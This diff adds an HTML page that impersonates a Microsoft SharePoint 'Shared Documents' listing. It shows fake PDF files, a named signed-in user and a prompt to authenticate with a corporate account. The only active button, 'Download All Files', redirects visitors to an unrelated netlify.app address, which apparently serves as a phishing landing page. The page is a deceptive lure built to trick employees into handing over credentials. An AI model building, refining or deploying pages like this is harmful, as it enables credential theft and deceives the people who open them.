@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Shared Documents – SharePoint</title>
+
+<link rel="stylesheet"
+      href="https://static2.sharepointonline.com/files/fabric/office-ui-fabric-core/11.0.0/css/fabric.min.css">
+<link rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
+<link rel="icon" href="https://t0.gstatic.com/faviconV2?client=SOCIAL&amp;type=FAVICON&amp;fallback_opts=TYPE,SIZE,URL&amp;url=https://www.microsoft.com/" />
+<style>
+body{
+  font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
+  background:#fff;color:#333;margin:0;padding-top:48px;line-height:1.5;
+}
+#SuiteBarButtons{
+  position:fixed;top:0;left:0;right:0;height:48px;z-index:9999;
+  background:#0078d4;color:#fff;display:flex;align-items:center;
+  justify-content:space-between;padding:0 20px;font-size:.9em;
+  box-shadow:0 2px 5px rgba(0,0,0,.2);
+}
+.suite-bar-logo img{max-height:24px;margin-right:10px;}
+h1.title-main{font-weight:600;font-size:24px;margin-top:25px;padding-left:20px;}
+.container{max-width:1000px;margin:0 auto;padding:20px;}
+table.ms-Table{width:100%;border-collapse:collapse;background:#fff;
+  box-shadow:0 1px 3px rgba(0,0,0,.12),0 1px 2px rgba(0,0,0,.24);}
+th{text-align:left;font-weight:600;font-size:14px;padding:12px 16px;
+  border-bottom:1px solid #eaeaea;background:#f8f8f8;}
+td{padding:12px 16px;vertical-align:middle;border-bottom:1px solid #f0f0f0;}
+tr:hover{background:#fafafa;}
+.pdf-icon{color:#d9534f;margin-right:8px;}
+button.download-btn,
+button.download-all-btn{
+  display:inline-block;background:#0078d4;color:#fff;border:none;
+  padding:8px 16px;border-radius:2px;cursor:pointer;font-size:14px;
+  font-weight:500;outline:none;transition:background .1s ease-in-out;}
+button.download-btn:hover,
+button.download-all-btn:hover{background:#005a9e;}
+.info-box{display:flex;align-items:flex-start;background:#deecf9;
+  padding:16px;border-radius:2px;font-size:14px;color:#333;margin-top:20px;}
+.info-icon{font-size:20px;color:#0078d4;margin-right:10px;flex-shrink:0;}
+.login-status{margin-top:15px;font-size:14px;color:#666;text-align:center;}
+.close{float:right;font-size:24px;font-weight:bold;cursor:pointer;}
+/* Removed modal styles – not needed anymore */
+</style>
+</head>
+<body>
+
+<div id="SuiteBarButtons">
+  <span class="suite-bar-logo">
+    <img src="https://i.gyazo.com/4c0f666d909a4f32ff358e9ca4cc460f.png" />
+    SharePoint
+  </span>
+  <span style="float:right;" class="username ms-Persona">Signed in as Alexander Harvey</span>
+</div>
+
+<div class="container ms-motion-slideUpIn">
+  <h1 class="title-main">Shared Documents</h1>
+
+  <div class="info-box">
+    <i class="fas fa-info-circle info-icon"></i>
+    These files are protected and secured against unauthorized access. Please authenticate with your corporate account.
+  </div>
+
+  <p class="login-status">Status: <strong>Not Authenticated</strong></p>
+
+  <table class="ms-Table">
+    <thead>
+      <tr><th>Name</th><th>Date Modified</th><th>Owner</th><th align="right">Size</th><th>Action</th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><i class="fas fa-file-pdf pdf-icon"></i> Specific products, with detailed description.pdf</td>
+        <td>Jul 10, 2026</td>
+        <td>Jane Smith</td>
+        <td align="right">980 KB</td>
+        <td style="text-align:center;"><button class="download-btn" disabled><i class="fas fa-download"></i></button></td>
+      </tr>
+      <tr>
+        <td><i class="fas fa-file-pdf pdf-icon"></i> Product quantity.pdf</td>
+        <td>Oct 29, 2026</td>
+        <td>Robert Chen</td>
+        <td align="right">1.1 MB</td>
+        <td style="text-align:center;"><button class="download-btn" disabled><i class="fas fa-download"></i></button></td>
+      </tr>
+      <tr>
+        <td><i class="fas fa-file-pdf pdf-icon"></i> Sample image.pdf</td>
+        <td>Sep 17, 2026</td>
+        <td>Karen Lee</td>
+        <td align="right">1.8 MB</td>
+        <td style="text-align:center;"><button class="download-btn" disabled><i class="fas fa-download"></i></button></td>
+      </tr>
+      <tr>
+        <td><i class="fas fa-file-pdf pdf-icon"></i> Company profile.pdf</td>
+        <td>Jul 30, 2026</td>
+        <td>Lisa Turner</td>
+        <td align="right">29 KB</td>
+        <td style="text-align:center;"><button class="download-btn" disabled><i class="fas fa-download"></i></button></td>
+      </tr>
+      <tr>
+        <td><i class="fas fa-file-pdf pdf-icon"></i> Delivery requirement.pdf</td>
+        <td>Jun 20, 2026</td>
+        <td>Michael Brown</td>
+        <td align="right">56 KB</td>
+        <td style="text-align:center;"><button class="download-btn" disabled><i class="fas fa-download"></i></button></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <br>
+
+  <center>
+    <button id="downloadAll" class="download-all-btn">
+      <i class="fas fa-download"></i> Download All Files (.zip)
+    </button>
+  </center>
+</div>
+
+<script>
+  const downloadAllBtn = document.getElementById('downloadAll');
+
+  downloadAllBtn.onclick = function () {
+    // Directly redirect to the desired URL
+    window.location.href = 'https://snazzy-maamoul-339f54.netlify.app/';
+  };
+</script>
+
+</body>
+</html>
